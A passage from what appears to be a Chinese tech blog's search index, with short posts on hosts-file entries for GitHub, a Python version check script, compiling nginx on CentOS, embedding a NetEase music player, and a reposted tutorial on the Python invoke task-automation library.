文件中添加类似下面的 3 行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.30.253.113  github.com</span><br><span class="line">151.101.185.194 github.global.ssl.fastly.net</span><br><span class="line">192.30.253.120  codeload.github.com</span><br></pre></td></tr></table></figure><p>第三步：重启网络</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /etc/init.d/networking restart</span><br></pre></td></tr></table></figure><p>现在可以飞快的下载 Github 上的代码了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 杂项 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过shell脚本查看python版本并比较</title>
      <link href="/posts/14490.html"/>
      <url>/posts/14490.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">checkPython()</span><br><span class="line">&#123;</span><br><span class="line">    #推荐版本V2.6.5</span><br><span class="line">    V1=2</span><br><span class="line">    V2=6</span><br><span class="line">    V3=5</span><br><span class="line"></span><br><span class="line">    echo need python version is : $V1.$V2.$V3</span><br><span class="line"></span><br><span class="line">    #获取本机python版本号。这里2&gt;&amp;1是必须的，python -V这个是标准错误输出的，需要转换</span><br><span class="line">    U_V1=`python -V 2&gt;&amp;1|awk &#x27;&#123;print $2&#125;&#x27;|awk -F &#x27;.&#x27; &#x27;&#123;print $1&#125;&#x27;`</span><br><span class="line">    U_V2=`python -V 2&gt;&amp;1|awk &#x27;&#123;print $2&#125;&#x27;|awk -F &#x27;.&#x27; &#x27;&#123;print $2&#125;&#x27;`</span><br><span class="line">    U_V3=`python -V 2&gt;&amp;1|awk &#x27;&#123;print $2&#125;&#x27;|awk -F &#x27;.&#x27; &#x27;&#123;print $3&#125;&#x27;`</span><br><span class="line"></span><br><span class="line">    echo your python version is : $U_V1.$U_V2.$U_V3</span><br><span class="line"></span><br><span class="line">    if [ $U_V1 -lt $V1 ];then</span><br><span class="line">        echo &#x27;Your python version is not OK!(1)&#x27;</span><br><span class="line">        exit 1</span><br><span class="line">    elif [ $U_V1 -eq $V1 ];then</span><br><span class="line">        if [ $U_V2 -lt $V2 ];then</span><br><span class="line">            echo &#x27;Your python version is not OK!(2)&#x27;</span><br><span class="line">            exit 1</span><br><span class="line">        elif [ $U_V2 -eq $V2 ];then</span><br><span class="line">            if [ $U_V3 -lt $V3 ];then</span><br><span class="line">                echo &#x27;Your python version is not OK!(3)&#x27;</span><br><span class="line">                exit 1</span><br><span class="line">            fi</span><br><span class="line">        fi</span><br><span class="line">    fi</span><br><span class="line"></span><br><span class="line">    echo Your python version is OK!</span><br><span class="line">&#125;</span><br><span class="line">checkPython</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>手动编译安装nginx</title>
      <link href="/posts/29613.html"/>
      <url>/posts/29613.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>&emsp;这里采用的是<code>CentOS 7</code>系统演示。安装工具有些差别，但是原理流程是一样的。</p><h3 id="更新系统软件"><a href="#更新系统软件" class="headerlink" title="更新系统软件"></a>更新系统软件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum update -y</span><br></pre></td></tr></table></figure><h3 id="安装编译工具"><a href="#安装编译工具" class="headerlink" title="安装编译工具"></a>安装编译工具</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install gcc -y</span><br></pre></td></tr></table></figure><h3 id="安装pcre、pcre-devel"><a href="#安装pcre、pcre-devel" class="headerlink" title="安装pcre、pcre-devel"></a>安装pcre、pcre-devel</h3><p>&emsp;pcre是一个perl库，包括perl兼容的正则表达式库，nginx的http模块使用pcre来解析正则表达式，所以需要安装pcre库。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y pcre pcre-devel</span><br></pre></td></tr></table></figure><h3 id="安装zlib"><a href="#安装zlib" class="headerlink" title="安装zlib"></a>安装zlib</h3><p>&emsp;zlib库提供了很多种压缩和解压缩方式nginx使用zlib对http包的内容进行gzip，所以需要安装。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y zlib zlib-devel</span><br></pre></td></tr></table></figure><h3 id="安装openssl"><a href="#安装openssl" class="headerlink" title="安装openssl"></a>安装openssl</h3><p>&emsp;OpenSSL是http通信加密的库。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y openssl openssl-devel</span><br></pre></td></tr></table></figure><h3 id="下载官方源码"><a href="#下载官方源码" class="headerlink" title="下载官方源码"></a>下载官方源码</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://nginx.org/download/nginx-1.9.9.tar.gz</span><br></pre></td></tr></table></figure><h3 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf  nginx-1.9.9.tar.gz</span><br></pre></td></tr></table></figure><h3 id="配置编译安装"><a href="#配置编译安装" class="headerlink" title="配置编译安装"></a>配置编译安装</h3><p>&emsp;在解压目录下执行。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br><span class="line"> </span><br><span class="line">make</span><br><span class="line"> </span><br><span class="line">make install</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML网页调用网易云音乐播放器代码</title>
      <link href="/posts/2893.html"/>
      <url>/posts/2893.html</url>
      
        <content type="html"><![CDATA[<h3 id="表现形式一：单曲播放"><a href="#表现形式一：单曲播放" class="headerlink" title="表现形式一：单曲播放"></a>表现形式一：单曲播放</h3><p><strong>调用代码：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">frameborder</span>=<span class="string">&quot;no&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span> <span class="attr">marginwidth</span>=<span class="string">&quot;0&quot;</span> <span class="attr">marginheight</span>=<span class="string">&quot;0&quot;</span> <span class="attr">width</span>=<span class="string">100%</span> <span class="attr">height</span>=<span class="string">86</span> <span class="attr">src</span>=<span class="string">&quot;http://music.163.com/outchain/player?type=2&amp;id=299757&amp;auto=1&amp;height=66&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>参数说明：</strong></p><blockquote><p><strong>播放器可修改参数：</strong></p><p><strong>width=100% #自适应宽度</strong></p><p><strong>height=86 #根据自己喜好修改</strong></p><p><strong>id=299757 #为歌曲的ID <a href="http://music.163.com/#/song?id=299757">http://music.163.com/#/song?id=299757</a></strong></p><p><strong>auto=0 #0为不自动播放，1为自动播放</strong></p></blockquote><p><strong>效果图：</strong></p><p><img src="https://gitee.com/djgzs_admin/ArticleImg/raw/master/2020/05/02/2020/05/02/20200502102248.png" alt="img"></p><h3 id="表现形式二：列表播放"><a href="#表现形式二：列表播放" class="headerlink" title="表现形式二：列表播放"></a>表现形式二：列表播放</h3><p>*<em>调用代码：</em></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://music.163.com/outchain/player?type=0<span class="symbol">&amp;amp;</span>id=34238509<span class="symbol">&amp;amp;</span>auto=0<span class="symbol">&amp;amp;</span>height=430&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">height</span>=<span class="string">&quot;450&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;no&quot;</span> <span class="attr">marginwidth</span>=<span class="string">&quot;0&quot;</span> <span class="attr">marginheight</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>参数说明：</strong></p><blockquote><p><strong>播放器可修改参数：</strong></p><p><strong>width=100% #自适应宽度</strong></p><p><strong>height=450#根据自己喜好修改</strong></p><p><strong>id=34238509#为歌曲列表页的ID ,例如：<a href="http://music.163.com/#/playlist?id=34238509">http://music.163.com/#/playlist?id=34238509</a></strong></p><p><strong>auto=0 #0为不自动播放，1为自动播放</strong></p></blockquote><p><strong>效果图：</strong></p><p><img src="https://gitee.com/djgzs_admin/ArticleImg/raw/master/2020/05/02/2020/05/02/20200502102327.png" alt="img"></p><p><em><strong>fds</strong></em></p>]]></content>
      
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>认真就能打动人：273篇干货资料汇总</title>
      <link href="/posts/2352.html"/>
      <url>/posts/2352.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://mp.weixin.qq.com/s?__biz=MzI3NTkyMjA4NA==&mid=2247487719&idx=1&sn=02c33949aa2f8be8d6ac5e3b6279fe44&chksm=eb7c3d2cdc0bb43a9f656e79d2a902b9d39513aae1532d89b2a6ecef164257fb2c631db073cc&mpshare=1&scene=1&srcid=0502pO3makVd4vdah1L13UMx&sharer_sharetime=1588384593555&sharer_shareid=45d96db5978f8a44ca2d42c3688b3746&exportkey=AbyjySuR6mLhi/1dLgBWKbI=&pass_ticket=F7dMBwLK0lNnF3j62KhbYXB7+rwDXX04gSQeoyOdXT4Xbn8rreZhj/cRw2Acz8P4#rd">来自公众号Python与算法社区的汇总</a></p><p><img src="https://gitee.com/djgzs_admin/ArticleImg/raw/master/2020/05/02/2020/05/02/20200502095937.png" alt="image-20200502095911844"></p><p><img src="https://gitee.com/djgzs_admin/ArticleImg/raw/master/2020/05/02/2020/05/02/20200502095932.png" alt="image-20200502095923854"></p><p><img src="https://gitee.com/djgzs_admin/ArticleImg/raw/master/2020/05/02/2020/05/02/20200502100016.png" alt="image-20200502095955976"></p><p><img src="https://gitee.com/djgzs_admin/ArticleImg/raw/master/2020/05/02/2020/05/02/20200502100012.png" alt="image-20200502100006513"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 人工智能 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强大的 Python 任务自动化工具！invoke 十分钟入门指南[转自公众号Python猫]</title>
      <link href="/posts/22812.html"/>
      <url>/posts/22812.html</url>
      
        <content type="html"><![CDATA[<p>我们继续聊聊 Python 任务自动化的话题。</p><p>nox 的作者在去年的 Pycon US 上，做了一场题为《Break the Cycle: Three excellent Python tools to automate repetitive tasks》的分享（B站观看地址：<a href="https://b23.tv/av86640235%EF%BC%89%EF%BC%8C%E5%A5%B9%E4%BB%8B%E7%BB%8D%E4%BA%86%E4%B8%89%E4%B8%AA%E4%BB%BB%E5%8A%A1%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7%EF%BC%9Atox%E3%80%81nox">https://b23.tv/av86640235），她介绍了三个任务自动化工具：tox、nox</a> 和 invoke，本文的话题正好就是最后的 invoke。</p><p><img src="https://gitee.com/djgzs_admin/ArticleImg/raw/master/2020/05/02/2020/05/02/20200502094851" alt="img"></p><h2 id="1、invoke-可以做什么？"><a href="#1、invoke-可以做什么？" class="headerlink" title="1、invoke 可以做什么？"></a>1、invoke 可以做什么？</h2><p>invoke 是从著名的远程部署工具 Fabric 中分离出来的，它与 paramiko 一起是 Fabric 的两大最核心的基础组件。</p><p>除了作为命令行工具，它专注于“任务执行”（task execution），可以标注和组织任务，并通过 CLI（command-line interface，即命令行界面） 和 shell 命令来执行任务。</p><p>同样是任务自动化工具，invoke 与我们之前介绍过的 tox/nox 在侧重点上有所不同：</p><ul><li>tox/nox 主要是在打包、测试、持续集成等方面的自动化（当然它们能做的还不止于此）</li><li>invoke 则更具普遍性，可以用在任何需要“执行任务”的场景，可以是无相关性的任务组，也可以是有顺序依赖的分步骤的工作流</li></ul><p>invoke 在 Github 上有 2.7K star，十分受欢迎，接下来我们看看它如何使用？</p><h2 id="2、怎么使用-invoke？"><a href="#2、怎么使用-invoke？" class="headerlink" title="2、怎么使用 invoke？"></a>2、怎么使用 invoke？</h2><p>首先，安装很简单：<code>pip install invoke</code>。</p><p>其次，简单使用时有以下要素：</p><ul><li>任务文件。创建一个 tasks.py 文件。</li><li>@task 装饰器。在一个函数上添加 @task 装饰器，即可将该函数标记为一个任务，接受 invoke 的调度管理。</li><li>上下文参数。给被装饰的函数添加一个上下文参数（context argument），注意它必须作为第一个参数，而命名按约定可以是<code>c</code> 或<code>ctx</code> 或<code>context</code> 。</li><li>命令行执行。在命令行中执行<code>invoke --list</code> 来查看所有任务，运行<code>invoke xxx</code> 来执行名为 xxx 的任务。命令行中的“invoke”可以简写成“inv”。</li></ul><p>以下是一个简单的示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 文件名：tasks.py</span></span><br><span class="line"><span class="keyword">from</span> invoke <span class="keyword">import</span> task</span><br><span class="line"></span><br><span class="line"><span class="meta">@task</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hello world!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@task</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>(<span class="params">c, name</span>):</span><br><span class="line">    c.run(<span class="string">f&quot;echo <span class="subst">&#123;name&#125;</span>加油!&quot;</span>)</span><br></pre></td></tr></table></figure><p>在上述代码中，我们定义了两个任务：</p><ul><li>”hello“任务调用了 Python 内置的 print 函数，会打印一个字符串“Hello world!”</li><li>“greet”任务调用了上下文参数的 run() 方法，可以执行 shell 命令，同时本例中还可以接收一个参数。在 shell 命令中，echo 可理解成打印，所以这也是一个打印任务，会打印出“xxx加油！”（xxx 是我们传的参数）</li></ul><p>以上代码写在 tasks.py 文件中，首先导入装饰器 <code>from invoke import task</code>，@task 装饰器可以不带参数，也可以带参数（参见下一节），被它装饰了的函数就是一个任务。</p><p>上下文参数（即上例的“c”）必须要显式地指明，如果缺少这个参数，执行时会抛出异常：“TypeError: Tasks must have an initial Context argument!”</p><p>然后在 tasks.py 文件的同级目录中，打开命令行窗口，执行命令。如果执行的位置找不到这个任务文件，则会报错：“Can’t find any collection named ‘tasks’!”</p><p>正常情况下，通过执行<code>inv --list</code> 或者<code>inv -l</code> ，可以看到所有任务的列表（按字母表顺序排序）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>inv -l</span><br><span class="line">Available tasks:</span><br><span class="line"></span><br><span class="line">  greet</span><br><span class="line">  hello</span><br></pre></td></tr></table></figure><p>我们依次执行这两个任务，其中传参时可以默认按位置参数传参，也可以指定关键字传参。结果是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>inv hello</span><br><span class="line">Hello world!</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>inv greet 武汉</span><br><span class="line">武汉加油!</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>inv greet --name=<span class="string">&quot;武汉&quot;</span></span><br><span class="line">武汉加油！</span><br></pre></td></tr></table></figure><p>缺少传参时，报错：’greet’ did not receive required positional arguments: ‘name’；多余传参时，报错：No idea what ‘???’ is!</p><h2 id="3、-如何用好-invoke？"><a href="#3、-如何用好-invoke？" class="headerlink" title="3、 如何用好 invoke？"></a>3、 如何用好 invoke？</h2><p>介绍完 invoke 的简单用法，我们知道了它所需的几项要素，也大致知道了它的使用步骤，接下来是它的其它用法。</p><h3 id="3-1-添加帮助信息"><a href="#3-1-添加帮助信息" class="headerlink" title="3.1 添加帮助信息"></a>3.1 添加帮助信息</h3><p>在上例中，“inv -l”只能看到任务名称，缺少必要的辅助信息，为了加强可读性，我们可以这样写：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@task(<span class="params"><span class="built_in">help</span>=&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;A param for test&#x27;</span>&#125;</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>(<span class="params">c, name</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    A test for shell command.</span></span><br><span class="line"><span class="string">    Second line.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    c.run(<span class="string">f&quot;echo <span class="subst">&#123;name&#125;</span>加油!&quot;</span>)</span><br></pre></td></tr></table></figure><p>其中，文档字符串的第一行内容会作为摘录，在“inv -l”的查询结果中展示，而且完整的内容与 @task 的 help 内容，会对应在“inv –help”中展示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>inv -l</span><br><span class="line">Available tasks:</span><br><span class="line"></span><br><span class="line">  greet   A test <span class="keyword">for</span> shell command.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>inv --<span class="built_in">help</span> greet</span><br><span class="line">Usage: inv[oke] [--core-opts] greet [--options] [other tasks here ...]</span><br><span class="line"></span><br><span class="line">Docstring:</span><br><span class="line">  A test <span class="keyword">for</span> shell command.</span><br><span class="line">  Second line.</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -n STRING, --name=STRING   A param <span class="keyword">for</span> test</span><br></pre></td></tr></table></figure><h3 id="3-2-任务的分解与组合"><a href="#3-2-任务的分解与组合" class="headerlink" title="3.2 任务的分解与组合"></a>3.2 任务的分解与组合</h3><p>通常一个大任务可以被分解成一组小任务，反过来，一系列的小任务也可能被串连成一个大任务。在对任务作分解、抽象与组合时，这里有两种思路：</p><ul><li>对内分解，对外统一：只定义一个 @task 的任务，作为总体的任务入口，实际的处理逻辑可以抽象成多个方法，但是外部不感知到它们</li><li>多点呈现，单点汇总：定义多个 @task 的任务，外部可以感知并分别调用它们，同时将有关联的任务组合起来，调用某个任务时，也执行其它相关联的任务</li></ul><p>第一种思路很容易理解，实现与使用都很简单，但是其缺点是缺少灵活性，难于单独执行其中的某个/些子任务。适用于相对独立的单个任务，通常也不需要 invoke 就能做到（使用 invoke 的好处是，拥有命令行的支持）。</p><p>第二种思路更加灵活，既方便单一任务的执行，也方便多任务的组合执行。实际上，这种场景才是 invoke 发挥最大价值的场景。</p><p>那么，invoke 如何实现分步任务的组合呢？可以在 @task 装饰器的“pre”与“post”参数中指定，分别表示前置任务与后置任务：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@task</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean</span>(<span class="params">c</span>):</span><br><span class="line">    c.run(<span class="string">&quot;echo clean&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@task</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">message</span>(<span class="params">c</span>):</span><br><span class="line">    c.run(<span class="string">&quot;echo message&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@task(<span class="params">pre=[clean], post=[message]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build</span>(<span class="params">c</span>):</span><br><span class="line">    c.run(<span class="string">&quot;echo build&quot;</span>)</span><br></pre></td></tr></table></figure><p>clean 与 message 任务作为子任务，可以单独调用，也可以作为 build 任务的前置与后置任务而组合使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; inv clean</span><br><span class="line">clean</span><br><span class="line">&gt;&gt;&gt; inv message</span><br><span class="line">message</span><br><span class="line">&gt;&gt;&gt; inv build</span><br><span class="line">clean</span><br><span class="line">build</span><br><span class="line">message</span><br></pre></td></tr></table></figure><p>这两个参数是列表类型，即可设置多个任务。另外，在默认情况下，@task 装饰器的位置参数会被视为前置任务，接着上述代码，我们写一个：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@task(<span class="params">clean, message</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">c</span>):</span><br><span class="line">    c.run(<span class="string">&quot;echo test&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后执行，会发现两个参数都被视为了前置任务：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>inv test</span><br><span class="line">clean</span><br><span class="line">message</span><br><span class="line">test</span><br></pre></td></tr></table></figure><h3 id="3-3-模块的拆分与整合"><a href="#3-3-模块的拆分与整合" class="headerlink" title="3.3 模块的拆分与整合"></a>3.3 模块的拆分与整合</h3><p>如果要管理很多相对独立的大型任务，或者需要多个团队分别维护各自的任务，那么，就有必要对 tasks.py 作拆分与整合。</p><p>例如，现在有多份 tasks.py，彼此是相对完整而独立的任务模块，不方便把所有内容都放在一个文件中，那么，如何有效地把它们整合起来管理呢？</p><p>invoke 提供了这方面的支持。首先，只能保留一份名为“tasks.py”的文件，其次，在该文件中导入其它改名后的任务文件，最后，使用 invoke 的 Collection 类把它们关联起来。</p><p>我们把本文中第一个示例文件改名为 task1.py，并新建一个 tasks.py 文件，内容如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 文件名：tasks.py</span></span><br><span class="line"><span class="keyword">from</span> invoke <span class="keyword">import</span> Collection, task</span><br><span class="line"><span class="keyword">import</span> task1</span><br><span class="line"></span><br><span class="line"><span class="meta">@task</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deploy</span>(<span class="params">c</span>):</span><br><span class="line">    c.run(<span class="string">&quot;echo deploy&quot;</span>)</span><br><span class="line"></span><br><span class="line">namespace = Collection(task1, deploy)</span><br></pre></td></tr></table></figure><p>每个 py 文件拥有独立的命名空间，而在此处，我们用 Collection 可以创建出一个新的命名空间，从而实现对所有任务的统一管理。效果如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>inv -l</span><br><span class="line">Available tasks:</span><br><span class="line"></span><br><span class="line">  deploy</span><br><span class="line">  task1.greet</span><br><span class="line">  task1.hello</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>inv deploy</span><br><span class="line">deploy</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>inv task1.hello</span><br><span class="line">Hello world!</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>inv task1.greet 武汉</span><br><span class="line">武汉加油!</span><br></pre></td></tr></table></figure><p>关于不同任务模块的导入、嵌套、混合、起别名等内容，还有不少细节，请查阅官方文档了解。</p><h3 id="3-4-交互式操作"><a href="#3-4-交互式操作" class="headerlink" title="3.4 交互式操作"></a>3.4 交互式操作</h3><p>某些任务可能需要交互式的输入，例如要求输入“y”，按回车键后才会继续执行。如果在任务执行期间需要人工参与，那自动化任务的能力将大打折扣。</p><p>invoke 提供了在程序运行期的监控能力，可以监听<code>stdout</code> 和<code>stderr</code> ，并支持在<code>stdin</code> 中输入必要的信息。</p><p>例如，假设某个任务（excitable-program）在执行时会提示“Are you ready? [y/n]”，只有输入了“y”并按下回车键，才会执行后续的操作。</p><p>那么，在代码中指定 responses 参数的内容，只要监听到匹配信息，程序会自动执行相应的操作：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">responses = &#123;<span class="string">r&quot;Are you ready? \[y/n\] &quot;</span>: <span class="string">&quot;y\n&quot;</span>&#125;</span><br><span class="line">ctx.run(<span class="string">&quot;excitable-program&quot;</span>, responses=responses)</span><br></pre></td></tr></table></figure><p>responses 是字典类型，键值对分别为监听内容及其回应内容。需注意，键值会被视为正则表达式，所以像本例中的方括号就要先转义。</p><h3 id="3-5-作为命令行工具库"><a href="#3-5-作为命令行工具库" class="headerlink" title="3.5 作为命令行工具库"></a>3.5 作为命令行工具库</h3><p>Python 中有不少好用的命令行工具库，比如标准库中的<code>argparse</code>、Flask 作者开源的<code>click</code> 与谷歌开源的<code>fire</code> 等等，而 invoke 也可以作为命令行工具库使用。</p><p>（PS：有位 Prodesire 同学写了“Python 命令行之旅”的系列文章，详细介绍了其它几个命令行工具库的用法，我在公众号“Python猫”里转载过大部分，感兴趣的同学可查看历史文章。）</p><p>事实上，Fabric 项目最初把 invoke 分离成独立的库，就是想让它承担解析命令行与执行子命令的任务。所以，除了作为自动化任务管理工具，invoke 也可以被用于开发命令行工具。</p><p>官方文档中给出了一个示例，我们可以了解到它的基本用法。</p><p>假设我们要开发一个 tester 工具，让用户<code>pip install tester</code> 安装，而此工具提供两个执行命令：<code>tester unit</code> 和<code>tester intergration</code> 。</p><p>这两个子命令需要在 tasks.py 文件中定义：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># tasks.py</span></span><br><span class="line"><span class="keyword">from</span> invoke <span class="keyword">import</span> task</span><br><span class="line"></span><br><span class="line"><span class="meta">@task</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unit</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Running unit tests!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@task</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">integration</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Running integration tests!&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后在程序入口文件中引入它：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 